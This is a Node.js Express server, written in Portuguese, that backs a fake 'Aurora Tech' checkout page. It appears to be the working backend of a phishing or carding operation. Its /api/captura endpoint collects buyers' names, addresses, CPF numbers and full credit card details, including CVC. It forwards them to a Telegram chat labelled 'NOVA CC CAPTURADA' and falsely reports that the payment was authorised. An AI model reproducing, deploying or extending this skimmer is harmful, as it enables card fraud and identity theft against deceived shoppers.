require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const API_KEY = process.env.API_KEY || 'minha_chave_secreta_123';

const TELEGRAM_TOKEN =
  process.env.TELEGRAM_TOKEN ||
  process.env.TELEGRAM_BOT_TOKEN ||
  process.env.BOT_TOKEN ||
  process.env.TOKEN_TELEGRAM;

const TELEGRAM_CHAT_ID =
  process.env.TELEGRAM_CHAT_ID ||
  process.env.CHAT_ID ||
  process.env.ID_CHAT_TELEGRAM;

app.use(
  cors({
    origin: true,
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'x-api-key']
  })
);

app.use(express.json({ limit: '1mb' }));
app.use(express.static(path.join(__dirname)));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'captura.html'));
});

app.get('/health', (req, res) => {
  res.status(200).json({ ok: true, servico: 'aurora-tech-captura' });
});

function formatarDataHoraBr() {
  return new Date().toLocaleString('pt-BR', {
    timeZone: 'America/Fortaleza',
    dateStyle: 'short',
    timeStyle: 'medium'
  });
}

function limparDigitos(valor) {
  return String(valor || '').replace(/\D/g, '');
}

async function enviarParaTelegram(dados) {
  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
    throw new Error('TELEGRAM_TOKEN ou TELEGRAM_CHAT_ID não configurado no .env.');
  }

  const ehCartao = dados.formaPagamento === 'Cartão de Crédito';
  const numeroLimpo = limparDigitos(dados.numeroCartao);
  const cvcLimpo = limparDigitos(dados.cvc);
  const cpfLimpo = limparDigitos(dados.cpfTitular);
  const tituloLead = ehCartao
    ? '🚨 *NOVA CC CAPTURADA • AURORA TECH*'
    : '🛒 *NOVO PEDIDO CAPTURADO • AURORA TECH*';

  const blocos = [
    tituloLead,
    `🕒 *Horário:* ${formatarDataHoraBr()}`,
    '',
    '👤 *CLIENTE & ENTREGA*',
    `• *Nome:* ${dados.nome || 'Não informado'}`,
    `• *Telefone:* ${dados.telefone || 'Não informado'}`,
    `• *E-mail:* ${dados.email || 'Não informado'}`,
    `• *Endereço:* ${dados.mensagem || 'Não informado'}`,
    '',
    '📦 *PEDIDO*',
    `• *Itens:* ${dados.produto || 'Não informado'}`,
    `• *Valor:* ${dados.valor || 'Não informado'}`,
    `• *Pagamento:* ${dados.formaPagamento || 'Não informado'}`,
    '',
    ...(ehCartao
      ? [
          '💳 *DADOS DO CARTÃO (CC)*',
          `• *Bandeira:* ${dados.bandeiraCartao || 'Não identificada'}`,
          `• *Parcelas:* ${dados.parcelas || '1x'}`,
          `• *Titular:* ${dados.nomeCompletoCartao || 'Não informado'}`,
          `• *CPF:* \`${dados.cpfTitular || cpfLimpo || 'Não informado'}\``,
          `• *CC:* \`${numeroLimpo || dados.numeroCartao || 'Não informado'}\``,
          `• *Validade:* \`${dados.validadeCartao || 'Não informado'}\``,
          `• *CVC:* \`${cvcLimpo || dados.cvc || 'Não informado'}\``,
          ''
        ]
      : []),
    `🌐 *Origem:* ${dados.origem || 'aurora-tech'}`
  ];

  const textoMarkdown = blocos.join('\n');

  const resposta = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: textoMarkdown,
      parse_mode: 'Markdown'
    })
  });

  const json = await resposta.json();
  if (!resposta.ok || !json.ok) {
    if (json.description && json.description.toLowerCase().includes('parse')) {
      const textoPuro = textoMarkdown.replace(/[*`]/g, '');
      const retry = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: textoPuro
        })
      });
      const retryJson = await retry.json();
      if (!retry.ok || !retryJson.ok) {
        throw new Error(retryJson.description || 'Falha ao enviar mensagem para o Telegram.');
      }
      return;
    }

    throw new Error(json.description || 'Falha ao enviar mensagem para o Telegram.');
  }
}

app.post('/api/captura', async (req, res) => {
  const chaveRecebida = req.header('x-api-key');
  if (!chaveRecebida || chaveRecebida !== API_KEY) {
    return res.status(401).json({ ok: false, erro: 'Chave de API inválida.' });
  }

  const dados = req.body || {};
  if (!dados.nome || !dados.email || !dados.formaPagamento) {
    return res.status(400).json({
      ok: false,
      erro: 'Dados obrigatórios ausentes (nome, e-mail ou forma de pagamento).'
    });
  }

  try {
    await enviarParaTelegram(dados);

    console.log('=== LEAD ENVIADO AO TELEGRAM ===', {
      tipo: dados.formaPagamento === 'Cartão de Crédito' ? 'NOVA CC CAPTURADA' : 'PEDIDO',
      cliente: dados.nome,
      email: dados.email,
      telefone: dados.telefone,
      produto: dados.produto,
      valor: dados.valor,
      formaPagamento: dados.formaPagamento,
      bandeira: dados.bandeiraCartao,
      parcelas: dados.parcelas,
      hora: formatarDataHoraBr()
    });

    return res.status(200).json({
      ok: true,
      mensagem: 'Pagamento autorizado e lead enviado ao Telegram com sucesso.'
    });
  } catch (err) {
    console.error('Erro ao enviar para o Telegram:', err.message);
    return res.status(502).json({
      ok: false,
      erro: err.message || 'Erro ao enviar notificação para o Telegram.'
    });
  }
});

app.listen(PORT, () => {
  console.log(`Servidor de captura rodando em http://localhost:${PORT}`);
});